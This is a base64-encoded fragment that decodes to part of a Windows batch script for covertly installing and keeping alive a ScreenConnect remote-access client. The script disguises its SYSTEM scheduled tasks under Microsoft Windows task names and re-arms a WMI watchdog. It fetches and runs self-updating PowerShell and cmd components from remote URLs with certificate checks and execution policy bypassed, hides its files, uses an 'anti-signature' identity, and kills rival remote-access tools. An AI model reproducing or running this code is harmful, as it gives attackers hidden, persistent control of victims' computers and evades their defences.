dGElXFNjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIgpzZXQgIk1TSUNBQ0hFPSVXRCVccGtn
Lm1zaSIKCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUiIDI+bnVsCmlmIG5vdCBleGlzdCAi
JUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwKCnNldCAiTU9OVkVSPU0yMCIKc2V0ICJQRjg2
PSVQcm9ncmFtRmlsZXMoeDg2KSUiCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBp
biAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSIKZWNoby4+PiIlTE9HJSIKZWNo
byDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIgpzZXQgIkNP
VU5UPTAiCnNldCAiSU5TVEFMTEVEPTAiCnNldCAiUFJJTV9PSz0wIgpzZXQgIkFMVF9PSz0wIgpz
ZXQgIkZPUkVJR05fTEVGVD0wIgpzZXQgIkZPUkVJR05fTElTVD0iCnNldCAiTVNJRVhJVD1ub3Qt
cnVuIgoKcmVtIOKUgOKUgCBbMF0gc2luZ2xlLWZsaWdodCBtdXRleCAoc3RvcCBvdmVybGFwcGlu
ZyB0aWNrcyByYWNpbmcgbXNpZXhlYykg4pSA4pSACnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2si
CmlmIGV4aXN0ICIlTVVURVglIiAoCiAgZm9yICUlQSBpbiAoIiVNVVRFWCUiKSBkbyBzZXQgIkxP
Q0tBR0U9JSV+dEEiCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29t
bWFuZCAiaWYoKFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRl
bSAtTGl0ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51
dGVzIC1sdCA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxCiAgaWYgZXJy
b3JsZXZlbCAxICgKICAgIGVjaG8gdGlja19za2lwcGVkX211dGV4X2J1c3k+PiIlTE9HJSIKICAg
IGVuZGxvY2FsCiAgICBleGl0IC9iIDAKICApCikKZWNobyAlREFURSUgJVRJTUUlICVSQU5ET00l
PiIlTVVURVglIgoKcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjEK
aWYgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCog
ZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcaWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVMIgpp
ZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9XE1pY3Jvc29mdFxXaW5kb3dzXERpYWdu
b3Npc1xTY2hlZHVsZWQiCmlmIG5vdCBkZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1cTWljcm9z
b2Z0XFdpbmRvd3NcUExBXFNlcnZlciIKaWYgbm90IGRlZmluZWQgVEFTS19DIHNldCAiVEFTS19D
PVxNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QiCmlmIG5vdCBkZWZpbmVkIFRB
U0tfRCBzZXQgIlRBU0tfRD1cTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxp
Y3QxIgppZiBub3QgZGVmaW5lZCBNT19BIHNldCAiTU9fQT0yIgppZiBub3QgZGVmaW5lZCBNT19C
IHNldCAiTU9fQj0zIgoKcmVtIOKUgOKUgCBbQV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVz
dCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgAppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIgoiJUNVUkwl
IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1v
ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0Ql
XHRnX3JlcG9ydC5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGlt
ZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVRHMiUiID5udWwgMj4mMQphdHRyaWIgLWgg
LXMgLXIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxCmZpbmRzdHIgL0M6IlRHX1JFUE9S
VCBCVUlMRCIgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIl
V0QlXHRnX3JlcG9ydC5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRn
X3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQpkZWwgL2YgL3EgIiVX
RCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAt
LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXci
ICIlT1dOU0VDJSIgPm51bCAyPiYxCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fc2VjdXJlLm5ldyIg
IiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93
bl9zZWN1cmUubmV3IiAiJU9XTlNFQzIlIiA+bnVsIDI+JjEKYXR0cmliIC1oIC1zIC1yICIlV0Ql
XG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjEKZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIg
IiVXRCVcb3duX3NlY3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25f
c2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVdEJVxvd25fc2VjdXJl
Lm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQpkZWwgL2YgL3EgIiVXRCVcb3du
X3NlY3VyZS5uZXciID5udWwgMj4mMQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25u
ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJ
QiUiID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5uZXciICIlQ1VSTCUiIC1M
IC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIg
IiVPV05MSUIyJSIgPm51bCAyPiYxCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbGliLnBzMSIg
Pm51bCAyPiYxCmZpbmRzdHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVdEJVxvd25fbGliLm5ldyIg
Pm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9saWIubmV3IikgZG8gaWYgJSV+ekYg
R1RSIDE1MDAgbW92ZSAveSAiJVdEJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5u
dWwgMj4mMQpkZWwgL2YgL3EgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4mMQpyZW0gc2VsZi11
cGRhdGU6IGRvd25sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0aGlzIHRpY2sgKEJVSUxE
LXZlcmlmaWVkKQpzZXQgIlNFTEZfVVBEPTAiCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAt
LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAi
JU9XTk1PTiUiID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0IiAiJUNV
UkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21v
bi5uZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjEKZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJTEQi
ICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgZm9yICUl
RiBpbiAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKAogIGZjIC9i
ICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQogIGlmIGVy
cm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiCikKaWYgIiVTRUxGX1VQRCUiPT0iMCIgZGVsIC9m
IC9xICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxCgpyZW0g4pSA4pSAIFtCXSByZS1hcm0g
Y2hhaW4gMSAoc2NodGFza3MpIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACnNjaHRhc2tzIC9RdWVyeSAvVE4gIiVUQVNLX0El
IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBlY2hvIHJlYXJtIFRBU0tfQSAlVEFTS19B
JT4+IiVMT0clIgogIHNjaHRhc2tzIC9DcmVhdGUgL0YgL1ROICIlVEFTS19BJSIgL1NDIE1JTlVU
RSAvTU8gJU1PX0ElIC9SVSBTWVNURU0gL1JMIEhJR0hFU1QgL1RSICJjbWQgL2MgJVdEJVxvd25f
bW9uLmNtZCIgPj4iJUxPRyUiIDI+JjEKICBzY2h0YXNrcyAvUnVuIC9UTiAiJVRBU0tfQSUiID5u
dWwgMj4mMQopCmlmIG5vdCBleGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYxCmlm
IGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxf
bW9uLmNtZCIgPm51bCAyPiYxCiAgY29weSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0
bF9tb24uY21kIiA+bnVsIDI+JjEKKQpzY2h0YXNrcyAvUXVlcnkgL1ROICIlVEFTS19CJSIgPm51
bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgZWNobyByZWFybSBUQVNLX0IgJVRBU0tfQiUgZXRs
X21vbj4+IiVMT0clIgogIHNjaHRhc2tzIC9DcmVhdGUgL0YgL1ROICIlVEFTS19CJSIgL1NDIE1J
TlVURSAvTU8gJU1PX0IlIC9SVSBTWVNURU0gL1JMIEhJR0hFU1QgL1RSICJjbWQgL2MgJUVUTCVc
ZXRsX21vbi5jbWQiID4+IiVMT0clIiAyPiYxCiAgc2NodGFza3MgL1J1biAvVE4gIiVUQVNLX0Il
IiA+bnVsIDI+JjEKKQpzY2h0YXNrcyAvUXVlcnkgL1ROICIlVEFTS19DJSIgPm51bCAyPiYxCmlm
IGVycm9ybGV2ZWwgMSAoCiAgZWNobyByZWFybSBUQVNLX0MgJVRBU0tfQyU+PiIlTE9HJSIKICBz
Y2h0YXNrcyAvQ3JlYXRlIC9GIC9UTiAiJVRBU0tfQyUiIC9TQyBPTlNUQVJUIC9SVSBTWVNURU0g
L1JMIEhJR0hFU1QgL1RSICJjbWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPj4iJUxPRyUiIDI+JjEK
KQpzY2h0YXNrcyAvUXVlcnkgL1ROICIlVEFTS19EJSIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwg
MSAoCiAgZWNobyByZWFybSBUQVNLX0QgJVRBU0tfRCU+PiIlTE9HJSIKICBzY2h0YXNrcyAvQ3Jl
YXRlIC9GIC9UTiAiJVRBU0tfRCUiIC9TQyBPTkxPR09OIC9SVSBTWVNURU0gL1JMIEhJR0hFU1Qg
L1RSICJjbWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPj4iJUxPRyUiIDI+JjEKKQoKcmVtIOKUgOKU
gCBbQjJdIHJlLWFybSBjaGFpbiAyIChXTUkgc3Vic2NyaXB0aW9uKSBpZiBtaXNzaW5nIOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKAogIGZv
ciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGli
LnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1Nb25QYXRoICIl
V0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RBVEU9JSVSIgogIGlmIC9JICIhV0RfU1RB
VEUhIj09IlJFQVJNRUQiIGVjaG8gd2F0Y2hkb2cgV01JIFJFQVJNRUQ+PiIlTE9HJSIKKQoKcmVt
IOKUgOKUgCBbRV0gZXh0ZXJtaW5hdGUgZm9yZWlnbiBTQyArIGRpc2FsbG93ZWQgUk1NIChCRUZP
UkUgaGVhbC9pbnN0YWxsLApyZW0gICAgIHNvIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFjdGlv
biBuZXZlciBjb2xsaWRlcyB3aXRoIHJpdmFscykg4pSA4pSACmlmIGV4aXN0ICIlV0QlXG93bl9s
aWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGV4dGVybWluYXRl
IC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQp0aW1lb3V0IC90IDggL25vYnJlYWsgPm51
bApzZXQgIkZPUkVJR05fTEVGVD0wIgpmb3IgL2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGlu
ICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3Jl
ZW5Db25uZWN0IENsaWVudCInKSBkbyAoCiAgc2V0ICJGUD0lJWEiCiAgc2V0ICJGUD0hRlA6ID0h
IgogIGlmIC9JIG5vdCAiIUZQISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAiIUZQISI9PSIlQUxU
X0ZQJSIgKAogICAgc2V0IC9hIENPVU5UKz0xCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xCiAg
ICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlHTl9MSVNUISFGUCEgIgogICAgZWNobyBmb3JlaWdu
X2xlZnRfIUZQIT4+IiVMT0clIgogICkKKQoKcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25u
ZWN0IHByaW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApmb3IgL2YgInRva2Vucz0x
LDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
RUVQX0ZQJSkiIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRSInKSBkbyAoCiAgc2V0ICJJTlNU
QUxMRUQ9MSIKICBzZXQgIlBSSU1TVEFURT0lJWIiCikKc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90IGVycm9ybGV2
ZWwgMSAoCiAgc2V0ICJQUklNX09LPTEiCiAgc2V0IC9hIENPVU5UKz0xCikKc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQppZiBub3QgZXJyb3JsZXZl
bCAxIHNldCAvYSBDT1VOVCs9MQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRf
RlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRf
T0s9MSIKCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgKICBlY2hv
IHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSIKICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogIHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsCiAg
c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5J
TkciID5udWwKICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIgopCnJlbSBNMTY6
IHN0aWxsIHN0b3BwZWQgLT4gcmVwYWlyIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QgKG1zaWV4ZWMg
L2ZhIHJlc3RvcmVzCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVwYWly
LVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykKaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlm
ICIlUFJJTV9PSyUiPT0iMCIgKAogIGVjaG8gc3ZjIGVzY2FsYXRlIHJlcGFpcj4+IiVMT0clIgog
IGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMx
IiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0cl
IiAyPiYxCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwKICBzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAogIGlmIG5vdCBl
cnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiCikKcmVtIE0xNjogb3JwaGFuZWQgc2VydmljZSBl
bnRyeSAocHJvZHVjdCB1bnJlZ2lzdGVyZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1pbHkKcmVtIHVw
Z3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3Vn
aCB0byB0aGUKcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQgb2YgYWxlcnRp
bmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1f
T0slIj09IjAiICgKICBzZXQgIlJFR1NUQVRFPXVua25vd24iCiAgaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiIGZvciAvZiAiZGVsaW1zPSIgJSVSIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25f
bGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdE
JSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiIKICBlY2hvIG9ycGhhbl9jaGVjaz0hUkVHU1RBVEUh
Pj4iJUxPRyUiCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgKICAgIGVjaG8gb3JwaGFuX3Nl
cnZpY2VfZGVsZXRlPj4iJUxPRyUiCiAgICBzYyBkZWxldGUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICAgIHNldCAiSU5TVEFMTEVEPTAiCiAgKQopCmlmICIl
SU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgKICBwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0Ql
XG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZF
UiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYxCiAgY2FsbCA6VGdTdGF0ZSBET1dO
ICJTY3JlZW5Db25uZWN0ICglS0VFUF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBzdGFydCIKICBn
b3RvIDpBZnRlckhlYWwKKQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6QWZ0ZXJIZWFsCgpy
ZW0g4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK
cmVtIE0xMjogRklSU1QgcmVwYWlyIHRoZSByZWdpc3RlcmVkIHByb2R1Y3QgKHJlY3JlYXRlcyBz
ZXJ2aWNlIHdpdGhvdXQKcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2ll
eGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4KZWNobyBzdmMgbWlzc2luZyAtIGhlYWwgYmVn
aW4+PiIlTE9HJSIKY2FsbCA6UmVwYWlyUmVnaXN0ZXJlZCAiJUtFRVBfRlAlIgpzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bApp
ZiBub3QgZXJyb3JsZXZlbCAxICgKICBzZXQgIklOU1RBTExFRD0xIgogIHNldCAiUFJJTV9PSz0x
IgogIGdvdG8gOkFmdGVySGVhbAopCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVjdCBzdGls
bCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQKc2V0ICJSRUdTVEFURT11
bmtub3duIgppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2ViYWNrcSBkZWxp
bXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlZ2lz
dGVyZWQgLUZwICIlS0VFUF9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiUkVHU1RBVEU9
JSVSIgppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgKICBlY2hvIHByaW1hcnlfcmVnaXN0ZXJl
ZF9za2lwX2ZyZXNoX2luc3RhbGw+PiIlTE9HJSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIu
cHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJh
ICJyZWdpc3RlcmVkLXN0dWNrIiA+bnVsIDI+JjEKICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1h
cnkgcmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVmdXNlZCAv
aSB0byBwcm90ZWN0IEFMVCIKICBnb3RvIDpBZnRlckhlYWwKKQppZiAiJUlOU1RBTExFRCUiPT0i
MCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiIKaWYgIiVJTlNUQUxMRUQlIj09
IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMSU/dD0lUkFORE9NJSIgImdpdGh1Yi1wa2ci
CmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzIlIiAianNk
ZWxpdnItcGtnIgppZiAiJUlOU1RBTExFRCUiPT0iMCIgKAogIHJlbSBwcmVmZXIgd29ya2VyLWNh
Y2hlZCAud3VjYWNoZVxwa2cubXNpIChzYW1lIGJpbmFyeSBhcyBkZXBsb3kpCiAgYXR0cmliIC1o
IC1zIC1yICIlTVNJQ0FDSEUlIiA+bnVsIDI+JjEKICBmb3IgJSVGIGluICgiJU1TSUNBQ0hFJSIp
IGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgKICAgIGVjaG8gd3VjYWNoZV9wa2dfcmV0cnk+PiIl
TE9HJSIKICAgIGF0dHJpYiAtaCAtcyAtciAiJU1TSSUiID5udWwgMj4mMQogICAgY29weSAveSAi
JU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjEKICApCiAgZm9yICUlRiBpbiAoIiVNU0klIikg
ZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKAogICAgZWNobyBjYWNoZSByZXRyeSBpbnN0YWxsPj4i
JUxPRyUiCiAgICBjYWxsIDpOb01zaVBvbGljeQogICAgbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAv
bm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNp
X2hlYWwubG9nIiA+bnVsIDI+JjEKICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiCiAgICBl
Y2hvIGNhY2hlIG1zaWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKICAgIGlmICIhTVNJRVhJ
VCEiPT0iMTYxOCIgKAogICAgICB0aW1lb3V0IC90IDMwIC9ub2JyZWFrID5udWwKICAgICAgbXNp
ZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1
cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxCiAgICAgIHNldCAiTVNJ
RVhJVD0hRVJST1JMRVZFTCEiCiAgICAgIGVjaG8gY2FjaGVfcmV0cnkxNjE4X2V4aXQ9IU1TSUVY
SVQhPj4iJUxPRyUiCiAgICApCiAgICBjYWxsIDpXYWl0U3ZjCiAgKQopCmNhbGwgOlJlc3RvcmVB
bHQKaWYgIiVJTlNUQUxMRUQlIj09IjAiICgKICBpZiBleGlzdCAiJVdEJVxtc2lfaGVhbC5sb2ci
ICgKICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVMT0clIgogICAgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiR2V0LUNvbnRlbnQgLUxp
dGVyYWxQYXRoICclV0QlXG1zaV9oZWFsLmxvZycgLVRhaWwgMTAiID4+IiVMT0clIiAyPiYxCiAg
KQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElUPWZldGNoLWZhaWwiCiAgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIg
